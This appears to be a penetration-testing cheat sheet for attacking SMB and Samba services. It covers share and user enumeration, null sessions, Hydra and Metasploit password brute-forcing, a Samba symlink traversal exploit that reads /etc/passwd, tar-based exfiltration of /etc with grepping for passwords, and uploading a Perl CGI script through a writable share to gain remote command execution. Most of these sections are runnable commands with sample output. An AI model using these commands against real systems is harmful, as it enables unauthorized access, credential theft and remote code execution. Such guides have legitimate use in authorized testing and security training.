---
description: ( TCP 445,139 )
---

# ⭕ SMB

## :information\_source: <mark style="color:blue;">Introduction</mark>

#### [Server Message Block](https://datatracker.ietf.org/doc/html/rfc5716)

SMB functions as a request-response or client-server protocol. The only time that the protocol does not work in a response-request framework is when a client requests an opportunistic lock (oplock) and the server has to break an existing oplock because the current mode is incompatible with the existing oplock. Client computers using SMB connect to a supporting server using NetBIOS over TCP/IP, IPX/SPX, or NetBUI. Once the connection is established, the client computer or program can then open, read/write, and access files similar to the file system on a local computer.

#### The SMB protocol supports two levels of security. The first is the share level. The server is protected at this level and each share has a password.

#### Designed to run on top of NetBIOS (Network Basic Input Output System) over TCP/IP using port TCP 139 for identification and UDP 137/138 for file transfer.

#### Port TCP 445 is supported for using SMB without NetBIOS as a transport (SMB over IP).

#### Implemented on both Windows and Linux (Samba) OSs.

### Windows SMB Versions

* CIFS: The old version of SMB, which was included in Microsoft Windows NT 4.0 in 1996.
* SMB 1.0 / SMB1: The version used in Windows 2000, Windows XP, Windows Server 2003 and Windows Server 2003 R2.
* SMB 2.0 / SMB2: This version used in Windows Vista and Windows Server 2008.
* SMB 2.1 / SMB2.1: This version used in Windows 7 and Windows Server 2008 R2.
* SMB 3.0 / SMB3: This version used in Windows 8 and Windows Server 2012.
* SMB 3.02 / SMB3: This version used in Windows 8.1 and Windows Server 2012 R2.
* SMB 3.1: This version used in Windows Server 2016 and Windows 10.

## :ballot\_box\_with\_check: <mark style="color:blue;">Checklist</mark>

* [ ] Enumerate hosts, shares and your access to shares
* [ ] Check for null sessions
* [ ] Login Brute Force
* [ ] Check for UNC path access in Windows
* [ ] Try to mount and access files in shares
* [ ] Check for CVEs

## <mark style="color:red;">Quick Check</mark>

```
rpcinfo -p $TARGET
nbtscan $TARGET

#list shares
smbclient -L //$TARGET -U ""

# null session
rpcclient -U "" $TARGET
smbclient -L //$TARGET
enum4linux $TARGET
```

## <mark style="color:red;">Enumeration</mark>

{% embed url="https://www.hackingarticles.in/a-little-guide-to-smb-enumeration" %}

### <mark style="color:orange;">Service Detection</mark>

```
nmap -sT –sU -sV 192.168.13.26 -p135,137,138,139,445 --open
```

### <mark style="color:orange;">Hostname Enumeration</mark>

```
nmblookup -A [ip]
enum4linux -a [ip]
```

### <mark style="color:orange;">Shares Enumeration</mark>

```
smbmap -H [ip/hostname]
echo exit | smbclient -L \\\\[ip]
nmap --script smb-enum-shares -p 139,445 [ip]
```

### <mark style="color:orange;">Check for Null Sessions</mark>

```
smbmap -H [ip/hostname]
rpcclient -U "" -N [ip]
smbclient \\\\[ip]\\[share name]
```

### <mark style="color:orange;">Check for CVEs</mark>

```
nmap --script smb-vuln* -p 139,445 [ip]
```

### <mark style="color:orange;">Manual Inspection</mark>

```
smbver.sh [IP] (port) [Samba]
```

#### remember to check pcap (packet capture) files for SMB authentication and credentials.

### <mark style="color:orange;">nmap scrips</mark>

```
nmap -v -p 139,445 --script=smb-vuln-ms08-067 --script-args=unsafe=1
nmap -p139,445 --script smb-os-discovery [target]
nmap -p137,139,445 --script smb-security-mode [target]
nmap -sU -p137 --script smb-security-mode [target]
nmap -p445 --script smb-vuln-ms08-067 [target]
nmap -p445 --script smb-vuln-* [target]
nmap -v -p139,445 --script smb-enum-users [target]
nmap -sU -p137 --script smb-enum-users --script-args samronly=true [target]
nmap -sU -p137 --script smb-enum-users --script-args lsaonly=true [target]
nmap -p139,445 --script smb-enum-shares --script-args smbusername=Administrator,smbpassword=Password [target]
nmap -sU -p137 --script smb-enum-shares [target]
nmap -p445 --script smb-enum-sessions [target]
$ nmap -p445 --script smb-brute --script-args userdb=users.txt,passdb=passwords.txt [target]
nmap -sU -p137 --script smb-enum-sessions [target]
nmap -p445 --script smb-vuln-double-pulsar-backdoor [target]
```

## <mark style="color:red;">Linux</mark>

Samba, a Linux-based implementation of the SMB/CIFS protocols, provides print and file sharing services for windows clients within an environment. Recent versions also seamlessly can be integrated with Active Directory domains

Samba can be found listening on the usual “NetBIOS” ports:

![](<../../.gitbook/assets/image (41) (1).png>)

### <mark style="color:orange;">fix smbclient protocol negotiation failed error</mark>

you might face this error on some of the enumeration tools in kali or any other Pentesting distro so i though i should say something about this.

```
edit /etc/samba/smb.conf

Add the following under global:

client min protocol = CORE
client max protocol = SMB3
```

this is a config file for smb service on your hacking machine and might interfere with some other services remember to change the protocol version later.

### <mark style="color:orange;">Access Shares - smbclient</mark>

#### list shares

```
smbclient -N -L \\\\[ip]\\
smbclient -N -L \\\\192.168.99.162\\
```

attempt to connect to smb service abd list smb files (we are after ADMIN$ usually smbclient \\\\\[ip]\\\[file] (we can open a file or put a file like ftp)

#### Access Share

```
smbclient \\\\[ip]\\[share name]
smbclient \\\\192.168.30.53\\WorkSharing
```

\`\` if you see any files of interest you can type the following

```
get [filename].txt /root/Desktop/[filename].txt 
```

### <mark style="color:orange;">smbmap</mark>

installation:

```
apt install smbmap
pip3 install --upgrade impacket → if got error authenticating upgrade impacket
```

usage:

```
smbmap -H [ip]
```

```
-H HOST IP of host
--host-file FILE File containing a list of hosts
-u USERNAME Username, if omitted null session assumed
-p PASSWORD Password or NTLM hash
-s SHARE Specify a share (default C$), ex 'C$'
-d DOMAIN Domain name (default WORKGROUP)
-P PORT SMB port (default 445)
-x COMMAND Execute a command ex. 'ipconfig /all'
-L List all drives on the specified host
--download/--upload/--delete
--skip --> skip delete confirm prompt
```

### <mark style="color:orange;">enum4linux</mark>

```
apt-get install ldapscripts  
```

open /etc/samba/smb.conf and add these under global section \[global]

```
...
client use spnego = no
client ntlmv2 auth = no
... 
```

run:

```
enum4linux -a [ip]
enum4linux -A -v [IP address]
```

cheat sheet:

{% embed url="https://highon.coffee/blog/enum4linux-cheat-sheet/" %}

### <mark style="color:orange;">nbtscan</mark>

```
nbtscan -v [IP Address orr address range IE /24]>
nbtscan [ip]
```

if you then see something like ELS-WINXP <20> Unique Registered -- then there is a server or share

## <mark style="color:red;">Windows</mark>

### <mark style="color:orange;">NetBIOS</mark>

NetBIOS stands for Network Basic Input Output System. Servers and clients use NetBIOS when viewing network shares on the local area network.

NetBIOS can supply some of the following information when querying a computer:

```
• Hostname
• NetBIOS name
• Domain
• Network shares
```

This block diagram represents the structure of NetBIOS

![](<../../.gitbook/assets/image (43).png>)

As you can see the NetBIOS layer sits between the application layer and the IP layer. UDP is used to perform NetBIOS name resolution and to carry other one-to-many datagram-based communications. By using NetBIOS datagrams, a host can send small messages to many other hosts. Heavy traffic, such as a file copy, relies on TCP by using NetBIOS sessions.

When an MS Windows machine browses a network, it uses NetBIOS:

```
• Datagrams to list the shares and the machines
• Names to find workgroups
• Sessions to transmit data to and from a Windows share
```

A Windows machine can share a file or a directory on the network; this lets local and remote users access the resource and, possibly, modify it. Starting from Windows Vista, users can choose to share a single file or use the Public directory. When sharing a single file, they can choose local or remote users to share the file with. When using the Public directory, they can choose which local users can access the files on the share, but they can only allow everyone or no one in the network to access the share.

### <mark style="color:orange;">UNC Paths</mark>

An authorized user can access shares by using Universal Naming Convention paths (UNC paths).

The format of a UNC path is:

```
\\ServerName\ShareName\file.nat
```

### <mark style="color:orange;">Administrative Shares</mark>

There are also some special default administrative shares which are used by system administrators and Windows itself:

• \ComputerName\C$ lets an administrator access a volume on the local machine. Every volume has a share (C$, D$, E$, etc.)

• \ComputerName\admin$ points to the windows installation directory

• \ComputerName\ipc$ is used for inter-process communication. You cannot browse it via Windows Explorer

​​You can test volume shares and the admin$ share on your computer by entering the following on your Windows Explorer address bar

## <mark style="color:red;">SMB Login Brute Force</mark>

```
hydra -l Administrator -P /usr/share/wordlists/rockyou.txt smb://172.16.2.11 -t 1 -vV -I
use auxiliary/scanner/smb/smb_login
```

## <mark style="color:red;">Symlink Directory Traversal</mark>

#### The vulnerability essentially allows an attacker to create a symbolic link to the root (/) partition from a writeable share ultimately allowing for read access to the entire file system outside of the share directory. Although this vulnerability can be exploited using a modified “smbclient,” Metasploit contains a module for exploitation, so we’ll use that for our purposes.

A pre-requisite to this particular vulnerability requires that the Samba server contains a writeable share and that the “widelinks” parameter in the smb.conf file is set with a value of “yes.” We can use the following “smbmap” command to determine shares available to us on a Samba server, in addition to determining whether or not we have read or write permissions to a given share.

{% hint style="info" %}
If you got error authenticating upgrade impacket
{% endhint %}

```
pip3 install --upgrade impacket
```

```
smbmap -H 192.168.13.29
```

![](<../../.gitbook/assets/image (276) (1) (1).png>)

#### <mark style="color:green;">Once we’ve determined a writeable share is available, in this case</mark> <mark style="color:green;"></mark><mark style="color:green;">`“tmp,”`</mark> <mark style="color:green;"></mark><mark style="color:green;">we can use Metasploit’s “samba\_symlink\_traversal” auxiliary module to create the symlink to the root filesystem.</mark>

```
use auxiliary/admin/smb/samba_symlink_traversal
```

![](<../../.gitbook/assets/image (294) (1) (1) (1).png>)

#### <mark style="color:green;">We can see from the above output, that a new “rootfs” directory has been created within the “tmp” share.</mark>

Our next step is to use “smbclient,” as we’ve seen from previous sections, to access the share, change into the “rootfs” directory, and download or upload files to the system where and if possible. We can do this with the following command:

edit `/etc/samba/smb.conf`

```
Add the following under global:
   client min protocol = CORE
   client max protocol = SMB3
```

```
smbclient \\\\192.168.13.29\\tmp -N
```

![](<../../.gitbook/assets/image (293) (1) (1).png>)

#### From here, we can simply use smbclient to change into the rootfs directory, and begin post exploitation, downloading/uploading files, etc. using the smbclient “get”

```
root@tester:~# cat passwd |less
```

#### Additionally, another useful command for data exfiltration when conducting post-exploitation tasks using smbclient is the “tar” command. With the tar command, we can create an archive of all files within a current directory, for local perusal later.

```
smb: \rootfs\tmp\rootfs\> cd etc
smb: \rootfs\tmp\rootfs\etc\> tar c ../tmp/all_files.tar *
```

#### The above will create a tar archive of the /etc/ directory on the target system to our local systems’ /tmp directory.

#### We can then extract, and start enumerating files for sensitive content, passwords, etc.

```
root@tester# tar xf /tmp/all_files.tar
root@tester# cd /tmp/rootfs/tmp/rootfs/etc/
root@tester# grep -r "password" * 2>&1 /dev/null
```

## <mark style="color:red;">From Writable Share to RCE</mark>

In certain situations where we have a fully patched Samba server, but have a writeable share available to us,we discover that a server we have enumerated is running a patched Samba server, and contains a share named “www,” which appears to be possibly configured to allow administrators to easily update an internal web applicationUsing our previous checks for Samba version and available shares using the Nmap smb-os-discovery NSE script, and smbmap, we have determined OS and Samba Version:

```
nmap --script smb-os-discovery 192.168.13.21 -p 445
```

#### We have also determined any shares that are available to us, as well as seeing that Guest sessions to the shares are possible as well:

```
smbmap -H 192.168.13.21
```

#### This finding is good news for us for a couple of reasons:

1. Web roots often contain files specific to a web server configuration, and can furthermore be used to obtain credentials to other services, .e.g, MySQL
2. Being able to write to a web root, is even better depending on the web server configuration; for instance, is PHP installed? Are there any other web server-interpreted languages we can use to our advantage? Can we upload any files to this directory, and how will the web server handle our files? Can we exploit that to obtain remote command execution?

Our first task is to connect to the share, and have a look at its contents, and secondly, we’ll want to determine if the Samba server has any HTTP ports listening, which might be serving the contents of the share.

Again, we’ll use smbclient to connect and have a look at any files within the “www” share.

We can connect to the share with smbclient and execute the Linux “ls” command to list files within the directory.

```
root@tester:~# smbclient \\\\192.168.13.21\\www -N
```

![](<../../.gitbook/assets/image (279) (1) (1).png>)

As the image above explains, the presence of a “.pl” extension indicates that the server is likely configured to process Perl (CGI) programs.

We can download the index.pl file with the “get” command, and take a look at its contents; perhaps we can gain some insight as to its purpose or function

![](<../../.gitbook/assets/image (277) (1).png>)

Looking at the file, we can determine that index.pl is a script that simply prints some environment variables regarding the web server configuration, as well as confirming that the server is also interpreting Perl scripts.

We’ve learned a bit more about the server. We now know it’s likely configured to process CGI scripts (Perl), but just to make sure, let’s attempt to browse to the HTTP port (which we should have discovered about this server during information gathering and enumeration). Just to confirm, a quick Nmap scan against the target for open ports, confirms that port 80 is in-fact open:

```
nmap -sT 192.168.13.21 --max-retries 1 -n -p 80 --open
```

Let’s point a browser at our target, to confirm that the index.pl script in the “www” share, is being served by the web server.

We also want to make sure that we do in-fact have WRITE permissions to the “www” share; again we’ll do this with smbclient, and the “put” command.

First, let’s create a file locally on your attacker system called “test.pl.” The contents of this file will execute the “id” Linux system command and will display your current UID and GID information when accessed with your browser.

test.pl:

```
#!/usr/bin/perl
print "Content-type: text/html\n\n";
system("id");
```

Next, let’s connect to the “www” share with “smbclient” and issue the “put” command, along with our test.pl file:

```
smbclient \\\\192.168.13.21\\www -N
smb: \> put test.pl
```

Next, let’s point a browser to our test.pl file on the target system and confirm that the output of the “id” command is printed to the page. This will confirm for us that we can upload our own Perl scripts to the server and can execute remote operating system commands through our test script

## <mark style="color:red;">Null Sessions</mark>

Null session attacks can be used to enumerate a lot of information. Attackers can steal information about:

```
• Passwords
• System users
• System groups
• Running system processes
```

Null sessions are remotely exploitable; this means that attackers can use their computers to attack a vulnerable Windows machine. Moreover, this attack can be used to call remote APIs and remote procedure calls. Because of these factors, null session attacks had a huge impact on Windows ecosystems. Nowadays Windows is configured to be immune from this kind of attack. However, legacy hosts can still be vulnerable! A null session attack exploits an authentication vulnerability for Windows Administrative Shares; this lets an attacker connect to a local or remote share without authentication We will go through the enumeration of windows shares and their exploitation by using various techniques and tools.

### <mark style="color:orange;">nbtstat</mark>

In Windows, the most common command to use when enumerating Windows shares is nbtstat. Nbtstat is a Windows command line tool that can display information about a target. You can check how to use it by passing it the /? parameter The most common use of nbtstat is "nbtstat -A \[IP]" that displays information about a target

![](<../../.gitbook/assets/image (42) (1).png>)

#### the first line tells us the name of the machine \[OVERLORD] the record type 00 tells us that OVERLORD is a workstation. the type UNIQUE tells us that this computer must have only one IP address assigned. second line contains the workgroup or the domain the computer is joined to. type 20 record means that the file sharing service is up and running on the machine.

​Once an attacker knows that a machine has the File Server service running, they can enumerate the shares by using the NET VIEW command.

```
NET VIEW [target ip]
```

![](<../../.gitbook/assets/image (39) (1).png>)

This machine is sharing a directory; the share name is shares You can also perform shares enumeration from a Linux machine. You need to use the tools provided by the Samba suite. Samba tools are already installed in Kali Linux, but you can install them in nearly every Linux distribution. To perform the same operations of nbtstat, you can use nmblookup with the same command line switch:

```
nmblookup -A [target ip ]
```

![](<../../.gitbook/assets/image (38) (1).png>)

## <mark style="color:red;">Checking for Null Sessions</mark>

Once we have detected that the File and Printer Sharing service is active and we have enumerated the available shares on a target, it is time to check if a null session attack is possible To verify that, we will exploit the IPC$ administrative share by trying to connect to it without valid credentials.

#### from linux

```
smbmap -H [ip/hostname]
rpcclient -U "" -N [ip]
smbclient \\\\[ip]\\[share name]
```

#### from windows

```
NET USE \\[target IP address]\IPC$ '' /u:''
net use \\10.130.40.80\IPC$ '' /u:''
```

This tells Windows to connect to the IPC$ share by using an empty password and an empty username!

### <mark style="color:orange;">metasploit modules</mark>

```
use auxiliary/scanner/smb/smb_enumshares
use auxiliary/scanner/smb/smb_enumusers
use auxiliary/scanner/smb/smb_version
```

#### gain access to smb shares

```
use auxiliary/admin/smb/samba_symlink_traversal
set SMBSHARE tmp
exit
smbclient //192.168.99.131/tmp
smb: \> cd rootfs
smb: \rootfs\> cd etc
smb: \rootfs\etc\> more passwd
```

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
[..]
```

## <mark style="color:red;">Mounting Shares From Linux</mark>

```
mount.cifs /192.168.99.162/C /media/K_share/ user=,pass=
nmblookup -A target
smbclient //MOUNT/share -I target -N
rpcclient -U “” target
```
